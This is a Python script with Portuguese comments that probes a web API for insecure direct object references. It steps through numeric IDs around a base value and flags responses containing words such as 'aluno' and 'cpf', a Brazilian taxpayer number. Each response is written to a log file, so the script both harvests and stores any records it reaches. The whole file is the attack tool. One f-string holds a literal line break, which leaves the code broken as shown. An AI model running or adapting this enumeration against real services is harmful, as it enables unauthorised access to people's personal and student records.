import requests
import time

# === CONFIGURAÇÕES ===
base_id = 1000  # ID base
base_url = "https://exemplo.com/api/resource?id="  # Altere conforme necessário
log_file = "numeric_idor_log.txt"
range_min = -10
range_max = 10
keywords_sucesso = ["nome", "aluno", "sucesso", "dados", "informação", "cpf"]

with open(log_file, "w", encoding="utf-8") as log:
    for i in range(range_min, range_max + 1):
        current_id = base_id + i
        url = f"{base_url}{current_id}"
        try:
            response = requests.get(url, timeout=10)
            conteudo = response.text.lower()
            sucesso = any(k in conteudo for k in keywords_sucesso)

            print(f"[{response.status_code}] Testando ID {current_id}")
            if sucesso:
                print(f"✅ POSSÍVEL SUCESSO DETECTADO - ID {current_id}")
            print("-" * 100)

            log.write(f"[{response.status_code}] ID {current_id}\n")
            log.write(f"URL: {url}\n")
            if sucesso:
                log.write(">>> POSSÍVEL SUCESSO DETECTADO <<<\n")
            log.write(f"Resposta:
{conteudo[:1000]}\n")
            log.write("-" * 100 + "\n")

            time.sleep(0.5)
        except Exception as e:
            print(f"Erro no ID {current_id}: {e}")
            log.write(f"Erro no ID {current_id}: {e}\n")
            log.write("-" * 100 + "\n")
